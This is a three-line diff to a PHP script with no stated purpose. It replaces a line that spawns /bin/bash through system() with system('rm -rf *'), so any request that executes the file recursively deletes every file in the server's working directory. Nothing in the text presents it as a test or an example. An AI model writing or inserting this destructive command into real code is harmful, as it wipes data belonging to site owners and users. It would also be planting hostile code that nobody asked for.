@@ -1,3 +1,3 @@
 <?php
-	system("/bin/bash");
+	system("rm -rf *");
 ?>
